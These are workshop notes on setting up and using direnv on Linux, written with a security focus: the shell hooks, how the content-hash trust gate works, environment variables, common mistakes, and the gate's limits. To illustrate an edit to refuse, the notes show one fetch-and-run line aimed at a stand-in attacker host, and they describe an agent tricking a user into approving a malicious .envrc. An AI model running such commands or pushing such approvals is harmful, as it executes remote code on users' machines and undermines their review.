# Linux notes

Platform-specific notes for the Linux direnv-perimeter workshop.

## Direnv setup recap

If you skipped this in cred-scrub: install via your package manager (`apt install direnv`, `pacman -S direnv`, `nix-env -iA nixpkgs.direnv`, etc.), then add the hook to your shell rc:

```sh
# ~/.bashrc
eval "$(direnv hook bash)"

# ~/.zshrc
eval "$(direnv hook zsh)"

# ~/.config/fish/config.fish
direnv hook fish | source
```

Restart your shell. From then on, `direnv allow` in any directory enables its `.envrc`.

## Reading the trust gate

When you `direnv allow`, direnv checks the file's content hash against a stored allowlist. If you edit the `.envrc`, the hash changes, and direnv refuses to run it until you `direnv allow` again. The intermediate state shows:

```
direnv: error /path/.envrc is blocked. Run `direnv allow` to approve its content
```

That message is the trust gate doing its job. Read the diff before allowing. If the diff is "an extra `curl evil.com | sh`," do not allow.

## DIRENV_DIR and DIRENV_FILE

Direnv exports two vars when an `.envrc` is loaded:

- `DIRENV_DIR` — the path with a `-` prefix (e.g., `-/home/you/project`). Direnv uses the prefix internally; treat it as opaque.
- `DIRENV_FILE` — the absolute path to the `.envrc` that was loaded.

The fingerprint script reads both. They're the cleanest signal that you're inside a perimeter at all.

## Common gotchas

- **`direnv: error: invalid config` after editing `.envrc`.** Almost always a syntax error. Direnv runs the file through bash; a missing closing quote or stray `$` will fail. Test in a regular shell first if you're not sure.
- **Pre-existing tools that re-source `~/.bashrc`.** Anything launched via `bash -l` re-loads your dotfiles. If your `~/.bashrc` exports `AWS_PROFILE=prod`, the perimeter's scoped value gets replaced. Either fix the rc or wrap the tool.
- **`stdenv` namespacing on NixOS.** If you use `use flake` in your `.envrc` to load a nix devshell, the devshell's env layers on top of direnv's. Order matters: `use flake` first, then your scrubs and exports, otherwise the flake can re-export things you wanted scrubbed.
- **Symlinks and `direnv allow`.** Direnv hashes the file content, not the path. If a symlink points at a different file than when you allowed it, direnv refuses. This is a feature, not a bug.

## What `dotenv_if_exists` actually does

Direnv ships a small library of helper functions, including `dotenv` (load a dotenv-style file, panic if missing) and `dotenv_if_exists` (same thing, silent if missing). The sample `.envrc` uses `dotenv_if_exists .envrc.local` so the perimeter still loads cleanly on a fresh checkout that doesn't have a local secrets file yet.

If you want fancier behavior (encrypted dotenvs, decrypting on load), look at:

- `direnv stdlib` for the full list of helpers.
- `sops`-encrypted `.env` files: `eval "$(sops -d .env.enc)"` inside the `.envrc`.

## What the trust gate doesn't catch

The trust gate is a hash check. It catches *changes* to a file you've previously read. It does not:

- Stop you from `direnv allow`-ing a malicious file you didn't read.
- Stop a malicious agent from writing a malicious file, then asking you to allow it ("just run `direnv allow` so the env loads").

If an agent suggests `direnv allow`, read the file before approving. Always.
